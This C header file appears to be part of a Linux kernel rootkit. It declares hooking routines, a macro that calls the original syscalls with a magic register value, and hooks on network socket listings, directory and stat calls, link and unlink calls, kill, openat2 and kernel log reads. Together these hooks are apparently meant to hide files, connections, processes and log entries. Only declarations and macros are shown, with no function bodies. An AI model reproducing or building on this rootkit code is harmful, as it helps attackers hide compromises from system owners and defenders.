#pragma once
#include <linux/module.h>
#include <linux/seq_file.h>

bool  hooks_install(void);
void  hooks_uninstall(void);
void *hooks_find(const char *symbol);
#define hfind(o, n)                                                                                                    \
  if (NULL == o) {                                                                                                     \
    o = hooks_find(n);                                                                                                 \
  }

#define hsyscall(o)                                                                                                    \
  asm("mov %1, %%r15;"                                                                                                 \
      "mov %2, %%rdi;"                                                                                                 \
      "call *%3;"                                                                                                      \
      "mov %%rax, %0"                                                                                                  \
      : "=m"(ret)                                                                                                      \
      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(o)                                                                            \
      : "%r15", "%rdi", "%rax");

asmlinkage int32_t h_tcp4_seq_show(struct seq_file *seq, void *v);
asmlinkage int32_t h_tcp6_seq_show(struct seq_file *seq, void *v);
asmlinkage int32_t h_udp4_seq_show(struct seq_file *seq, void *v);
asmlinkage int32_t h_udp6_seq_show(struct seq_file *seq, void *v);

asmlinkage int64_t h_kill(const struct pt_regs *);

asmlinkage int64_t h_getdents64(const struct pt_regs *);
asmlinkage int64_t h_getdents(const struct pt_regs *);

asmlinkage int64_t h_fchdir(const struct pt_regs *r);
asmlinkage int64_t h_chdir(const struct pt_regs *r);

asmlinkage int64_t h_unlinkat(const struct pt_regs *r);
asmlinkage int64_t h_unlink(const struct pt_regs *r);

asmlinkage int64_t h_symlinkat(const struct pt_regs *r);
asmlinkage int64_t h_symlink(const struct pt_regs *r);
asmlinkage int64_t h_linkat(const struct pt_regs *r);
asmlinkage int64_t h_link(const struct pt_regs *r);

asmlinkage int64_t h_newfstatat(const struct pt_regs *r);
asmlinkage int64_t h_lstat(const struct pt_regs *r);
asmlinkage int64_t h_fstat(const struct pt_regs *r);
asmlinkage int64_t h_statx(const struct pt_regs *r);
asmlinkage int64_t h_stat(const struct pt_regs *r);

asmlinkage int64_t h_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how);

asmlinkage ssize_t h_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);
